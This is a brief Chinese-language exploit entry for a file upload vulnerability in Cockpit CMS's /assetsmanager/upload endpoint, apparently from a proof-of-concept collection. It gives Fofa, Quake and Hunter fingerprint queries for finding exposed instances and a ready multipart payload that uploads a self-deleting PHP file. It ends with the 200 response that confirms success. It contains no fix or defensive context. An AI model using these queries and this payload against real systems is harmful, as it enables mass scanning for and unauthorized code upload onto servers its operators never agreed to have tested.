# cockpit系统assetsmanager_upload接口文件上传漏洞

cockpit ｜ 文件上传 ｜ —
- **指纹**：`Fofa：title="Authenticate Please!" 或 quake：title:"Authenticate Please!" 或 hunter：web.title="Authenticate Please!"`
- **请求**：`POST /assetsmanager/upload HTTP/1.1`

**Payload**
```
-----------------------------36D28FBc36bd6feE7Fb3
Content-Disposition: form-data; name="files[]"; filename="dudesite.php"
Content-Type: text/php
<?php echo "dudesite123";unlink(__FILE__);?>
-----------------------------36D28FBc36bd6feE7Fb3
Content-Disposition: form-data; name="folder"
-----------------------------36D28FBc36bd6feE7Fb3--
```
- **响应特征**：200